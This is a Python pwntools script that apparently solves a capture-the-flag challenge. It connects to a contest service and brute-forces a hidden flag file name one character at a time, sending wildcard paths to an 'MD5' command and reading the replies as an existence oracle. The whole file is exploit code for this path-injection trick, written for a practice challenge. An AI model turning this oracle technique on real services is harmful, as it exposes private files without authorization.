from pwn import *

HOST, PORT = "md5service.nc.jctf.pro", "1337"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil("Cmd: ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

l = 'abcdef0123456789_'
l = string.lowercase + string.uppercase + string.digits
cur = '/0c8702194e16f006e61f45d5fa0cd511/flag_a6214417905b7d091f00ff59b51d5d78.{0}{1}'
while True:
	try:
		menu()
		for x in l:
			ii('MD5 %s' % (cur.format(x, '*')))
			data = menu()
			print x, data
			if "'\\n'" not in data:
				cur = cur.replace('{0}', x + '{0}')
				print `cur`
				r.close()
				break
	except:
		r.close()
		r = remote(HOST, PORT)
